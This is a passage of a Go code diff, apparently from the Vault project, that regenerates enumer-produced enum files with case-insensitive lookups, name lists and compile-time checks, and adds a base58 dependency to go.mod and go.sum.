+ 		return fmt.Sprintf("WhenInconsistentAction(%d)", i)
+@@ -17,12 +20,30 @@ func (i WhenInconsistentAction) String() string {
+ 	return _WhenInconsistentActionName[_WhenInconsistentActionIndex[i]:_WhenInconsistentActionIndex[i+1]]
+ }
+ 
+-var _WhenInconsistentActionValues = []WhenInconsistentAction{0, 1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _WhenInconsistentActionNoOp() {
++	var x [1]struct{}
++	_ = x[WhenInconsistentFail-(0)]
++	_ = x[WhenInconsistentRetry-(1)]
++	_ = x[WhenInconsistentForward-(2)]
++}
++
++var _WhenInconsistentActionValues = []WhenInconsistentAction{WhenInconsistentFail, WhenInconsistentRetry, WhenInconsistentForward}
+ 
+ var _WhenInconsistentActionNameToValueMap = map[string]WhenInconsistentAction{
+-	_WhenInconsistentActionName[0:4]:  0,
+-	_WhenInconsistentActionName[4:9]:  1,
+-	_WhenInconsistentActionName[9:16]: 2,
++	_WhenInconsistentActionName[0:4]:       WhenInconsistentFail,
++	_WhenInconsistentActionLowerName[0:4]:  WhenInconsistentFail,
++	_WhenInconsistentActionName[4:9]:       WhenInconsistentRetry,
++	_WhenInconsistentActionLowerName[4:9]:  WhenInconsistentRetry,
++	_WhenInconsistentActionName[9:16]:      WhenInconsistentForward,
++	_WhenInconsistentActionLowerName[9:16]: WhenInconsistentForward,
++}
++
++var _WhenInconsistentActionNames = []string{
++	_WhenInconsistentActionName[0:4],
++	_WhenInconsistentActionName[4:9],
++	_WhenInconsistentActionName[9:16],
+ }
+ 
+ // WhenInconsistentActionString retrieves an enum value from the enum constants string name.
+@@ -31,6 +52,10 @@ func WhenInconsistentActionString(s string) (WhenInconsistentAction, error) {
+ 	if val, ok := _WhenInconsistentActionNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _WhenInconsistentActionNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to WhenInconsistentAction values", s)
+ }
+ 
+@@ -39,6 +64,13 @@ func WhenInconsistentActionValues() []WhenInconsistentAction {
+ 	return _WhenInconsistentActionValues
+ }
+ 
++// WhenInconsistentActionStrings returns a slice of all String values of the enum
++func WhenInconsistentActionStrings() []string {
++	strs := make([]string, len(_WhenInconsistentActionNames))
++	copy(strs, _WhenInconsistentActionNames)
++	return strs
++}
++
+ // IsAWhenInconsistentAction returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i WhenInconsistentAction) IsAWhenInconsistentAction() bool {
+ 	for _, v := range _WhenInconsistentActionValues {
+diff --git a/command/generaterootkind_enumer.go b/command/generaterootkind_enumer.go
+index a53d2846de..1f371216d7 100644
+--- a/command/generaterootkind_enumer.go
++++ b/command/generaterootkind_enumer.go
+@@ -4,12 +4,15 @@ package command
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _generateRootKindName = "RegularDRRecovery"
+ 
+ var _generateRootKindIndex = [...]uint8{0, 7, 9, 17}
+ 
++const _generateRootKindLowerName = "regulardrrecovery"
++
+ func (i generateRootKind) String() string {
+ 	if i < 0 || i >= generateRootKind(len(_generateRootKindIndex)-1) {
+ 		return fmt.Sprintf("generateRootKind(%d)", i)
+@@ -17,12 +20,30 @@ func (i generateRootKind) String() string {
+ 	return _generateRootKindName[_generateRootKindIndex[i]:_generateRootKindIndex[i+1]]
+ }
+ 
+-var _generateRootKindValues = []generateRootKind{0, 1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _generateRootKindNoOp() {
++	var x [1]struct{}
++	_ = x[generateRootRegular-(0)]
++	_ = x[generateRootDR-(1)]
++	_ = x[generateRootRecovery-(2)]
++}
++
++var _generateRootKindValues = []generateRootKind{generateRootRegular, generateRootDR, generateRootRecovery}
+ 
+ var _generateRootKindNameToValueMap = map[string]generateRootKind{
+-	_generateRootKindName[0:7]:  0,
+-	_generateRootKindName[7:9]:  1,
+-	_generateRootKindName[9:17]: 2,
++	_generateRootKindName[0:7]:       generateRootRegular,
++	_generateRootKindLowerName[0:7]:  generateRootRegular,
++	_generateRootKindName[7:9]:       generateRootDR,
++	_generateRootKindLowerName[7:9]:  generateRootDR,
++	_generateRootKindName[9:17]:      generateRootRecovery,
++	_generateRootKindLowerName[9:17]: generateRootRecovery,
++}
++
++var _generateRootKindNames = []string{
++	_generateRootKindName[0:7],
++	_generateRootKindName[7:9],
++	_generateRootKindName[9:17],
+ }
+ 
+ // generateRootKindString retrieves an enum value from the enum constants string name.
+@@ -31,6 +52,10 @@ func generateRootKindString(s string) (generateRootKind, error) {
+ 	if val, ok := _generateRootKindNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _generateRootKindNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to generateRootKind values", s)
+ }
+ 
+@@ -39,6 +64,13 @@ func generateRootKindValues() []generateRootKind {
+ 	return _generateRootKindValues
+ }
+ 
++// generateRootKindStrings returns a slice of all String values of the enum
++func generateRootKindStrings() []string {
++	strs := make([]string, len(_generateRootKindNames))
++	copy(strs, _generateRootKindNames)
++	return strs
++}
++
+ // IsAgenerateRootKind returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i generateRootKind) IsAgenerateRootKind() bool {
+ 	for _, v := range _generateRootKindValues {
+diff --git a/command/healthcheck/resultstatus_enumer.go b/command/healthcheck/resultstatus_enumer.go
+index eb8182cb4a..80dd9b3ae1 100644
+--- a/command/healthcheck/resultstatus_enumer.go
++++ b/command/healthcheck/resultstatus_enumer.go
+@@ -4,12 +4,15 @@ package healthcheck
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _ResultStatusName = "not_applicableokinformationalwarningcriticalinvalid_versioninsufficient_permissions"
+ 
+ var _ResultStatusIndex = [...]uint8{0, 14, 16, 29, 36, 44, 59, 83}
+ 
++const _ResultStatusLowerName = "not_applicableokinformationalwarningcriticalinvalid_versioninsufficient_permissions"
++
+ func (i ResultStatus) String() string {
+ 	if i < 0 || i >= ResultStatus(len(_ResultStatusIndex)-1) {
+ 		return fmt.Sprintf("ResultStatus(%d)", i)
+@@ -17,16 +20,46 @@ func (i ResultStatus) String() string {
+ 	return _ResultStatusName[_ResultStatusIndex[i]:_ResultStatusIndex[i+1]]
+ }
+ 
+-var _ResultStatusValues = []ResultStatus{0, 1, 2, 3, 4, 5, 6}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _ResultStatusNoOp() {
++	var x [1]struct{}
++	_ = x[ResultNotApplicable-(0)]
++	_ = x[ResultOK-(1)]
++	_ = x[ResultInformational-(2)]
++	_ = x[ResultWarning-(3)]
++	_ = x[ResultCritical-(4)]
++	_ = x[ResultInvalidVersion-(5)]
++	_ = x[ResultInsufficientPermissions-(6)]
++}
++
++var _ResultStatusValues = []ResultStatus{ResultNotApplicable, ResultOK, ResultInformational, ResultWarning, ResultCritical, ResultInvalidVersion, ResultInsufficientPermissions}
+ 
+ var _ResultStatusNameToValueMap = map[string]ResultStatus{
+-	_ResultStatusName[0:14]:  0,
+-	_ResultStatusName[14:16]: 1,
+-	_ResultStatusName[16:29]: 2,
+-	_ResultStatusName[29:36]: 3,
+-	_ResultStatusName[36:44]: 4,
+-	_ResultStatusName[44:59]: 5,
+-	_ResultStatusName[59:83]: 6,
++	_ResultStatusName[0:14]:       ResultNotApplicable,
++	_ResultStatusLowerName[0:14]:  ResultNotApplicable,
++	_ResultStatusName[14:16]:      ResultOK,
++	_ResultStatusLowerName[14:16]: ResultOK,
++	_ResultStatusName[16:29]:      ResultInformational,
++	_ResultStatusLowerName[16:29]: ResultInformational,
++	_ResultStatusName[29:36]:      ResultWarning,
++	_ResultStatusLowerName[29:36]: ResultWarning,
++	_ResultStatusName[36:44]:      ResultCritical,
++	_ResultStatusLowerName[36:44]: ResultCritical,
++	_ResultStatusName[44:59]:      ResultInvalidVersion,
++	_ResultStatusLowerName[44:59]: ResultInvalidVersion,
++	_ResultStatusName[59:83]:      ResultInsufficientPermissions,
++	_ResultStatusLowerName[59:83]: ResultInsufficientPermissions,
++}
++
++var _ResultStatusNames = []string{
++	_ResultStatusName[0:14],
++	_ResultStatusName[14:16],
++	_ResultStatusName[16:29],
++	_ResultStatusName[29:36],
++	_ResultStatusName[36:44],
++	_ResultStatusName[44:59],
++	_ResultStatusName[59:83],
+ }
+ 
+ // ResultStatusString retrieves an enum value from the enum constants string name.
+@@ -35,6 +68,10 @@ func ResultStatusString(s string) (ResultStatus, error) {
+ 	if val, ok := _ResultStatusNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _ResultStatusNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to ResultStatus values", s)
+ }
+ 
+@@ -43,6 +80,13 @@ func ResultStatusValues() []ResultStatus {
+ 	return _ResultStatusValues
+ }
+ 
++// ResultStatusStrings returns a slice of all String values of the enum
++func ResultStatusStrings() []string {
++	strs := make([]string, len(_ResultStatusNames))
++	copy(strs, _ResultStatusNames)
++	return strs
++}
++
+ // IsAResultStatus returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i ResultStatus) IsAResultStatus() bool {
+ 	for _, v := range _ResultStatusValues {
+diff --git a/go.mod b/go.mod
+index e4d345ff93..e882aa95cc 100644
+--- a/go.mod
++++ b/go.mod
+@@ -490,6 +490,7 @@ require (
+ 	github.com/modern-go/reflect2 v1.0.2 // indirect
+ 	github.com/mongodb-forks/digest v1.1.0 // indirect
+ 	github.com/montanaflynn/stats v0.7.1 // indirect
++	github.com/mr-tron/base58 v1.2.0
+ 	github.com/mtibben/percent v0.2.1 // indirect
+ 	github.com/munnerz/goautoneg v0.0.0-20191010083416-a7dc8b61c822 // indirect
+ 	github.com/natefinch/atomic v1.0.1 // indirect
+diff --git a/go.sum b/go.sum
+index 36e015bc66..af09354367 100644
+--- a/go.sum
++++ b/go.sum
+@@ -1909,6 +1909,8 @@ github.com/montanaflynn/stats v0.7.1 h1:etflOAAHORrCC44V+aR6Ftzort912ZU+YLiSTuV8
+ github.com/montanaflynn/stats v0.7.1/go.mod h1:etXPPgVO6n31NxCd9KQUMvCM+ve0ruNzt6R8Bnaayow=
+ github.com/morikuni/aec v1.0.0 h1:nP9CBfwrvYnBRgY6qfDQkygYDmYwOilePFkwzv4dU8A=
+ github.com/morikuni/aec v1.0.0/go.mod h1:BbKIizmSmc5MMPqRYbxO4ZU0S0+P200+tUnFx7PXmsc=
++github.com/mr-tron/base58 v1.2.0 h1:T/HDJBh4ZCPbU39/+c3rRvE0uKBQlU27+QI8LJ4t64o=
++github.com/mr-tron/base58 v1.2.0/go.mod h1:BinMc/sQntlIE1frQmRFPUoPA1Zkr8VRgBdjWI2mNwc=
+ github.com/mtibben/percent v0.2.1 h1:5gssi8Nqo8QU/r2pynCm+hBQHpkB/uNK7BJCFogWdzs=
+ github.com/mtibben/percent v0.2.1/go.mod h1:KG9uO+SZkUp+VkRHsCdYQV3XSZrrSpR3O9ibNBTZrns=
+ github.com/munnerz/goautoneg v0.0.0-20191010083416-a7dc8b61c822 h1:C3w9PqII01/Oq1c1nUAm88MOHcQC9l5mIlSMApZMrHA=
+diff --git a/helper/testhelpers/generaterootkind_enumer.go b/helper/testhelpers/generaterootkind_enumer.go
+index 496b4eb98e..1fb340e8fa 100644
+--- a/helper/testhelpers/generaterootkind_enumer.go
++++ b/helper/testhelpers/generaterootkind_enumer.go
+@@ -4,12 +4,15 @@ package testhelpers
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _GenerateRootKindName = "RegularDRGenerateRecovery"
+ 
+ var _GenerateRootKindIndex = [...]uint8{0, 7, 9, 25}
+ 
++const _GenerateRootKindLowerName = "regulardrgeneraterecovery"
++
+ func (i GenerateRootKind) String() string {
+ 	if i < 0 || i >= GenerateRootKind(len(_GenerateRootKindIndex)-1) {
+ 		return fmt.Sprintf("GenerateRootKind(%d)", i)
+@@ -17,12 +20,30 @@ func (i GenerateRootKind) String() string {
+ 	return _GenerateRootKindName[_GenerateRootKindIndex[i]:_GenerateRootKindIndex[i+1]]
+ }
+ 
+-var _GenerateRootKindValues = []GenerateRootKind{0, 1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _GenerateRootKindNoOp() {
++	var x [1]struct{}
++	_ = x[GenerateRootRegular-(0)]
++	_ = x[GenerateRootDR-(1)]
++	_ = x[GenerateRecovery-(2)]
++}
++
++var _GenerateRootKindValues = []GenerateRootKind{GenerateRootRegular, GenerateRootDR, GenerateRecovery}
+ 
+ var _GenerateRootKindNameToValueMap = map[string]GenerateRootKind{
+-	_GenerateRootKindName[0:7]:  0,
+-	_GenerateRootKindName[7:9]:  1,
+-	_GenerateRootKindName[9:25]: 2,
++	_GenerateRootKindName[0:7]:       GenerateRootRegular,
++	_GenerateRootKindLowerName[0:7]:  GenerateRootRegular,
++	_GenerateRootKindName[7:9]:       GenerateRootDR,
++	_GenerateRootKindLowerName[7:9]:  GenerateRootDR,
++	_GenerateRootKindName[9:25]:      GenerateRecovery,
++	_GenerateRootKindLowerName[9:25]: GenerateRecovery,
++}
++
++var _GenerateRootKindNames = []string{
++	_GenerateRootKindName[0:7],
++	_GenerateRootKindName[7:9],
++	_GenerateRootKindName[9:25],
+ }
+ 
+ // GenerateRootKindString retrieves an enum value from the enum constants string name.
+@@ -31,6 +52,10 @@ func GenerateRootKindString(s string) (GenerateRootKind, error) {
+ 	if val, ok := _GenerateRootKindNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _GenerateRootKindNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to GenerateRootKind values", s)
+ }
+ 
+@@ -39,6 +64,13 @@ func GenerateRootKindValues() []GenerateRootKind {
+ 	return _GenerateRootKindValues
+ }
+ 
++// GenerateRootKindStrings returns a slice of all String values of the enum
++func GenerateRootKindStrings() []string {
++	strs := make([]string, len(_GenerateRootKindNames))
++	copy(strs, _GenerateRootKindNames)
++	return strs
++}
++
+ // IsAGenerateRootKind returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i GenerateRootKind) IsAGenerateRootKind() bool {
+ 	for _, v := range _GenerateRootKindValues {
+diff --git a/internalshared/configutil/entropymode_enumer.go b/internalshared/configutil/entropymode_enumer.go
+index 6b804001c4..e7e844f9e1 100644
+--- a/internalshared/configutil/entropymode_enumer.go
++++ b/internalshared/configutil/entropymode_enumer.go
+@@ -4,12 +4,15 @@ package configutil
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _EntropyModeName = "UnknownAugmentation"
+ 
+ var _EntropyModeIndex = [...]uint8{0, 7, 19}
+ 
++const _EntropyModeLowerName = "unknownaugmentation"
++
+ func (i EntropyMode) String() string {
+ 	if i < 0 || i >= EntropyMode(len(_EntropyModeIndex)-1) {
+ 		return fmt.Sprintf("EntropyMode(%d)", i)
+@@ -17,11 +20,26 @@ func (i EntropyMode) String() string {
+ 	return _EntropyModeName[_EntropyModeIndex[i]:_EntropyModeIndex[i+1]]
+ }
+ 
+-var _EntropyModeValues = []EntropyMode{0, 1}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _EntropyModeNoOp() {
++	var x [1]struct{}
++	_ = x[EntropyUnknown-(0)]
++	_ = x[EntropyAugmentation-(1)]
++}
++
++var _EntropyModeValues = []EntropyMode{EntropyUnknown, EntropyAugmentation}
+ 
+ var _EntropyModeNameToValueMap = map[string]EntropyMode{
+-	_EntropyModeName[0:7]:  0,
+-	_EntropyModeName[7:19]: 1,
++	_EntropyModeName[0:7]:       EntropyUnknown,
++	_EntropyModeLowerName[0:7]:  EntropyUnknown,
++	_EntropyModeName[7:19]:      EntropyAugmentation,
++	_EntropyModeLowerName[7:19]: EntropyAugmentation,
++}
++
++var _EntropyModeNames = []string{
++	_EntropyModeName[0:7],
++	_EntropyModeName[7:19],
+ }
+ 
+ // EntropyModeString retrieves an enum value from the enum constants string name.
+@@ -30,6 +48,10 @@ func EntropyModeString(s string) (EntropyMode, error) {
+ 	if val, ok := _EntropyModeNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _EntropyModeNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to EntropyMode values", s)
+ }
+ 
+@@ -38,6 +60,13 @@ func EntropyModeValues() []EntropyMode {
+ 	return _EntropyModeValues
+ }
+ 
++// EntropyModeStrings returns a slice of all String values of the enum
++func EntropyModeStrings() []string {
++	strs := make([]string, len(_EntropyModeNames))
++	copy(strs, _EntropyModeNames)
++	return strs
++}
++
+ // IsAEntropyMode returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i EntropyMode) IsAEntropyMode() bool {
+ 	for _, v := range _EntropyModeValues {
+diff --git a/sdk/database/dbplugin/v5/credentialtype_enumer.go b/sdk/database/dbplugin/v5/credentialtype_enumer.go
+index d61011b718..2cbd8e4b3b 100644
+--- a/sdk/database/dbplugin/v5/credentialtype_enumer.go
++++ b/sdk/database/dbplugin/v5/credentialtype_enumer.go
+@@ -4,12 +4,15 @@ package dbplugin
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _CredentialTypeName = "passwordrsa_private_keyclient_certificate"
+ 
+ var _CredentialTypeIndex = [...]uint8{0, 8, 23, 41}
+ 
++const _CredentialTypeLowerName = "passwordrsa_private_keyclient_certificate"
++
+ func (i CredentialType) String() string {
+ 	if i < 0 || i >= CredentialType(len(_CredentialTypeIndex)-1) {
+ 		return fmt.Sprintf("CredentialType(%d)", i)
+@@ -17,12 +20,30 @@ func (i CredentialType) String() string {
+ 	return _CredentialTypeName[_CredentialTypeIndex[i]:_CredentialTypeIndex[i+1]]
+ }
+ 
+-var _CredentialTypeValues = []CredentialType{0, 1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _CredentialTypeNoOp() {
++	var x [1]struct{}
++	_ = x[CredentialTypePassword-(0)]
++	_ = x[CredentialTypeRSAPrivateKey-(1)]
++	_ = x[CredentialTypeClientCertificate-(2)]
++}
++
++var _CredentialTypeValues = []CredentialType{CredentialTypePassword, CredentialTypeRSAPrivateKey, CredentialTypeClientCertificate}
+ 
+ var _CredentialTypeNameToValueMap = map[string]CredentialType{
+-	_CredentialTypeName[0:8]:   0,
+-	_CredentialTypeName[8:23]:  1,
+-	_CredentialTypeName[23:41]: 2,
++	_CredentialTypeName[0:8]:        CredentialTypePassword,
++	_CredentialTypeLowerName[0:8]:   CredentialTypePassword,
++	_CredentialTypeName[8:23]:       CredentialTypeRSAPrivateKey,
++	_CredentialTypeLowerName[8:23]:  CredentialTypeRSAPrivateKey,
++	_CredentialTypeName[23:41]:      CredentialTypeClientCertificate,
++	_CredentialTypeLowerName[23:41]: CredentialTypeClientCertificate,
++}
++
++var _CredentialTypeNames = []string{
++	_CredentialTypeName[0:8],
++	_CredentialTypeName[8:23],
++	_CredentialTypeName[23:41],
+ }
+ 
+ // CredentialTypeString retrieves an enum value from the enum constants string name.
+@@ -31,6 +52,10 @@ func CredentialTypeString(s string) (CredentialType, error) {
+ 	if val, ok := _CredentialTypeNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _CredentialTypeNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to CredentialType values", s)
+ }
+ 
+@@ -39,6 +64,13 @@ func CredentialTypeValues() []CredentialType {
+ 	return _CredentialTypeValues
+ }
+ 
++// CredentialTypeStrings returns a slice of all String values of the enum
++func CredentialTypeStrings() []string {
++	strs := make([]string, len(_CredentialTypeNames))
++	copy(strs, _CredentialTypeNames)
++	return strs
++}
++
+ // IsACredentialType returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i CredentialType) IsACredentialType() bool {
+ 	for _, v := range _CredentialTypeValues {
+diff --git a/sdk/database/helper/credsutil/caseop_enumer.go b/sdk/database/helper/credsutil/caseop_enumer.go
+index 3a96c63222..e5073d479f 100644
+--- a/sdk/database/helper/credsutil/caseop_enumer.go
++++ b/sdk/database/helper/credsutil/caseop_enumer.go
+@@ -4,12 +4,15 @@ package credsutil
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _CaseOpName = "keep_caseuppercaselowercase"
+ 
+ var _CaseOpIndex = [...]uint8{0, 9, 18, 27}
+ 
++const _CaseOpLowerName = "keep_caseuppercaselowercase"
++
+ func (i CaseOp) String() string {
+ 	if i < 0 || i >= CaseOp(len(_CaseOpIndex)-1) {
+ 		return fmt.Sprintf("CaseOp(%d)", i)
+@@ -17,12 +20,30 @@ func (i CaseOp) String() string {
+ 	return _CaseOpName[_CaseOpIndex[i]:_CaseOpIndex[i+1]]
+ }
+ 
+-var _CaseOpValues = []CaseOp{0, 1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _CaseOpNoOp() {
++	var x [1]struct{}
++	_ = x[KeepCase-(0)]
++	_ = x[Uppercase-(1)]
++	_ = x[Lowercase-(2)]
++}
++
++var _CaseOpValues = []CaseOp{KeepCase, Uppercase, Lowercase}
+ 
+ var _CaseOpNameToValueMap = map[string]CaseOp{
+-	_CaseOpName[0:9]:   0,
+-	_CaseOpName[9:18]:  1,
+-	_CaseOpName[18:27]: 2,
++	_CaseOpName[0:9]:        KeepCase,
++	_CaseOpLowerName[0:9]:   KeepCase,
++	_CaseOpName[9:18]:       Uppercase,
++	_CaseOpLowerName[9:18]:  Uppercase,
++	_CaseOpName[18:27]:      Lowercase,
++	_CaseOpLowerName[18:27]: Lowercase,
++}
++
++var _CaseOpNames = []string{
++	_CaseOpName[0:9],
++	_CaseOpName[9:18],
++	_CaseOpName[18:27],
+ }
+ 
+ // CaseOpString retrieves an enum value from the enum constants string name.
+@@ -31,6 +52,10 @@ func CaseOpString(s string) (CaseOp, error) {
+ 	if val, ok := _CaseOpNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _CaseOpNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to CaseOp values", s)
+ }
+ 
+@@ -39,6 +64,13 @@ func CaseOpValues() []CaseOp {
+ 	return _CaseOpValues
+ }
+ 
++// CaseOpStrings returns a slice of all String values of the enum
++func CaseOpStrings() []string {
++	strs := make([]string, len(_CaseOpNames))
++	copy(strs, _CaseOpNames)
++	return strs
++}
++
+ // IsACaseOp returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i CaseOp) IsACaseOp() bool {
+ 	for _, v := range _CaseOpValues {
+diff --git a/sdk/helper/consts/pluginruntimetype_enumer.go b/sdk/helper/consts/pluginruntimetype_enumer.go
+index 337afc29c3..5936b14bd4 100644
+--- a/sdk/helper/consts/pluginruntimetype_enumer.go
++++ b/sdk/helper/consts/pluginruntimetype_enumer.go
+@@ -4,12 +4,15 @@ package consts
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _PluginRuntimeTypeName = "unsupportedcontainer"
+ 
+ var _PluginRuntimeTypeIndex = [...]uint8{0, 11, 20}
+ 
++const _PluginRuntimeTypeLowerName = "unsupportedcontainer"
++
+ func (i PluginRuntimeType) String() string {
+ 	i -= 1
+ 	if i >= PluginRuntimeType(len(_PluginRuntimeTypeIndex)-1) {
+@@ -18,11 +21,26 @@ func (i PluginRuntimeType) String() string {
+ 	return _PluginRuntimeTypeName[_PluginRuntimeTypeIndex[i]:_PluginRuntimeTypeIndex[i+1]]
+ }
+ 
+-var _PluginRuntimeTypeValues = []PluginRuntimeType{1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _PluginRuntimeTypeNoOp() {
++	var x [1]struct{}
++	_ = x[PluginRuntimeTypeUnsupported-(1)]
++	_ = x[PluginRuntimeTypeContainer-(2)]
++}
++
++var _PluginRuntimeTypeValues = []PluginRuntimeType{PluginRuntimeTypeUnsupported, PluginRuntimeTypeContainer}
+ 
+ var _PluginRuntimeTypeNameToValueMap = map[string]PluginRuntimeType{
+-	_PluginRuntimeTypeName[0:11]:  1,
+-	_PluginRuntimeTypeName[11:20]: 2,
++	_PluginRuntimeTypeName[0:11]:       PluginRuntimeTypeUnsupported,
++	_PluginRuntimeTypeLowerName[0:11]:  PluginRuntimeTypeUnsupported,
++	_PluginRuntimeTypeName[11:20]:      PluginRuntimeTypeContainer,
++	_PluginRuntimeTypeLowerName[11:20]: PluginRuntimeTypeContainer,
++}
++
++var _PluginRuntimeTypeNames = []string{
++	_PluginRuntimeTypeName[0:11],
++	_PluginRuntimeTypeName[11:20],
+ }
+ 
+ // PluginRuntimeTypeString retrieves an enum value from the enum constants string name.
+@@ -31,6 +49,10 @@ func PluginRuntimeTypeString(s string) (PluginRuntimeType, error) {
+ 	if val, ok := _PluginRuntimeTypeNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _PluginRuntimeTypeNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to PluginRuntimeType values", s)
+ }
+ 
+@@ -39,6 +61,13 @@ func PluginRuntimeTypeValues() []PluginRuntimeType {
+ 	return _PluginRuntimeTypeValues
+ }
+ 
++// PluginRuntimeTypeStrings returns a slice of all String values of the enum
++func PluginRuntimeTypeStrings() []string {
++	strs := make([]string, len(_PluginRuntimeTypeNames))
++	copy(strs, _PluginRuntimeTypeNames)
++	return strs
++}
++
+ // IsAPluginRuntimeType returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i PluginRuntimeType) IsAPluginRuntimeType() bool {
+ 	for _, v := range _PluginRuntimeTypeValues {
+diff --git a/sdk/helper/keysutil/marshalingtype_enumer.go b/sdk/helper/keysutil/marshalingtype_enumer.go
+index 93b5c2f1f9..0598e3ded0 100644
+--- a/sdk/helper/keysutil/marshalingtype_enumer.go
++++ b/sdk/helper/keysutil/marshalingtype_enumer.go
+@@ -4,12 +4,15 @@ package keysutil
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _MarshalingTypeName = "asn1jws"
+ 
+ var _MarshalingTypeIndex = [...]uint8{0, 4, 7}
+ 
++const _MarshalingTypeLowerName = "asn1jws"
++
+ func (i MarshalingType) String() string {
+ 	i -= 1
+ 	if i >= MarshalingType(len(_MarshalingTypeIndex)-1) {
+@@ -18,11 +21,26 @@ func (i MarshalingType) String() string {
+ 	return _MarshalingTypeName[_MarshalingTypeIndex[i]:_MarshalingTypeIndex[i+1]]
+ }
+ 
+-var _MarshalingTypeValues = []MarshalingType{1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _MarshalingTypeNoOp() {
++	var x [1]struct{}
++	_ = x[MarshalingTypeASN1-(1)]
++	_ = x[MarshalingTypeJWS-(2)]
++}
++
++var _MarshalingTypeValues = []MarshalingType{MarshalingTypeASN1, MarshalingTypeJWS}
+ 
+ var _MarshalingTypeNameToValueMap = map[string]MarshalingType{
+-	_MarshalingTypeName[0:4]: 1,
+-	_MarshalingTypeName[4:7]: 2,
++	_MarshalingTypeName[0:4]:      MarshalingTypeASN1,
++	_MarshalingTypeLowerName[0:4]: MarshalingTypeASN1,
++	_MarshalingTypeName[4:7]:      MarshalingTypeJWS,
++	_MarshalingTypeLowerName[4:7]: MarshalingTypeJWS,
++}
++
++var _MarshalingTypeNames = []string{
++	_MarshalingTypeName[0:4],
++	_MarshalingTypeName[4:7],
+ }
+ 
+ // MarshalingTypeString retrieves an enum value from the enum constants string name.
+@@ -31,6 +49,10 @@ func MarshalingTypeString(s string) (MarshalingType, error) {
+ 	if val, ok := _MarshalingTypeNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _MarshalingTypeNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to MarshalingType values", s)
+ }
+ 
+@@ -39,6 +61,13 @@ func MarshalingTypeValues() []MarshalingType {
+ 	return _MarshalingTypeValues
+ }
+ 
++// MarshalingTypeStrings returns a slice of all String values of the enum
++func MarshalingTypeStrings() []string {
++	strs := make([]string, len(_MarshalingTypeNames))
++	copy(strs, _MarshalingTypeNames)
++	return strs
++}
++
+ // IsAMarshalingType returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i MarshalingType) IsAMarshalingType() bool {
+ 	for _, v := range _MarshalingTypeValues {
+diff --git a/sdk/helper/ocsp/failopenmode_enumer.go b/sdk/helper/ocsp/failopenmode_enumer.go
+index d0cf9f5e92..dfafd2b13f 100644
+--- a/sdk/helper/ocsp/failopenmode_enumer.go
++++ b/sdk/helper/ocsp/failopenmode_enumer.go
+@@ -4,12 +4,15 @@ package ocsp
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _FailOpenModeName = "ocspFailOpenNotSetTrueFalse"
+ 
+ var _FailOpenModeIndex = [...]uint8{0, 18, 22, 27}
+ 
++const _FailOpenModeLowerName = "ocspfailopennotsettruefalse"
++
+ func (i FailOpenMode) String() string {
+ 	if i >= FailOpenMode(len(_FailOpenModeIndex)-1) {
+ 		return fmt.Sprintf("FailOpenMode(%d)", i)
+@@ -17,12 +20,30 @@ func (i FailOpenMode) String() string {
